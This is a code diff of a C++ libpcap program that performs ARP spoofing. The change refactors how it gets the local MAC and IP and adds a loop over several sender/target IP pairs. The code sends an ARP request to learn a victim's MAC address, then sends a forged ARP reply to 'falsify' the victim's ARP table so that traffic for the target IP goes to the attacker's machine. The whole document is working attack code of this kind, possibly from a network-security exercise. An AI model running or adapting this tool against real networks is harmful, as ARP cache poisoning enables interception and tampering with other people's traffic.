@@ -10,31 +10,28 @@ int main(int argc, char *argv[])
 	}
 	// for multiple execution
 	int iter;
-	for (iter = 2; iter <= argc; iter += 2)
+	for (iter = 2; iter <= argc-1; iter += 2)
 	{
+		printf("ARP SEND..\n\n");
 		char *dev = argv[1];
-		unsigned char macAddress[6];
 		const char *interfaceName = argv[1];
-		char src_mac[18];
 		// Collecting info for ARP packet
-		int result = getMACAddress(interfaceName, macAddress);
-		if (result == 0)
+		unsigned char src_mac[6];
+		if (getMACAddress(interfaceName, src_mac) == 0)
 		{
-			sprintf(src_mac, "%02X:%02X:%02X:%02X:%02X:%02X",
-					macAddress[0], macAddress[1], macAddress[2],
-					macAddress[3], macAddress[4], macAddress[5]);
-			printf("src MAC : %s\n", src_mac);
+			printf("src MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",
+					src_mac[0], src_mac[1], src_mac[2],
+					src_mac[3], src_mac[4], src_mac[5]);
 		}
 		else
 		{
 			printf("Failed to get MAC Address.\n");
 		}
 
-		char src_ipAddress[INET_ADDRSTRLEN];
-		if (getIPAddress(interfaceName, src_ipAddress) == 0)
+		 char src_ip[INET_ADDRSTRLEN];
+		if (getIPAddress(interfaceName, src_ip) == 0)
 		{
-			src_ipAddress[15] = '\0';
-			printf("src IP: %s\n", src_ipAddress);
+			printf("src IP : %s\n",src_ip);
 		}
 		else
 		{
@@ -61,9 +58,9 @@ int main(int argc, char *argv[])
 		packet.arp_.hln_ = Mac::SIZE;
 		packet.arp_.pln_ = Ip::SIZE;
 		packet.arp_.smac_ = Mac(src_mac);
-		packet.arp_.sip_ = htonl(Ip(src_ipAddress));
+		packet.arp_.sip_ = htonl(Ip(src_ip));
 		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-		packet.arp_.tip_ = htonl(Ip(argv[2]));
+		packet.arp_.tip_ = htonl(Ip(argv[iter]));
 
 		int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
 
@@ -94,7 +91,7 @@ int main(int argc, char *argv[])
 		}
 
 		printf("dst MAC : %s\n", dst_mac);
-		printf("dst IP : %s\n", argv[2]);
+		printf("dst IP : %s\n", argv[iter]);
 
 		// Send ARP Reply packet to falsify victim(sender)'s ARP table
 		packet.eth_.dmac_ = Mac(dst_mac);
@@ -110,9 +107,9 @@ int main(int argc, char *argv[])
 		packet.arp_.pln_ = Ip::SIZE;
 
 		packet.arp_.smac_ = Mac(src_mac);
-		packet.arp_.sip_ = htonl(Ip(argv[3]));
+		packet.arp_.sip_ = htonl(Ip(argv[iter+1]));
 		packet.arp_.tmac_ = Mac(dst_mac);
-		packet.arp_.tip_ = htonl(Ip(argv[2]));
+		packet.arp_.tip_ = htonl(Ip(argv[iter]));
 
 		int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
 		if (res2 != 0)
@@ -122,4 +119,5 @@ int main(int argc, char *argv[])
 
 		pcap_close(handle);
 	}
+	printf("\n------------------------------\n");
 }
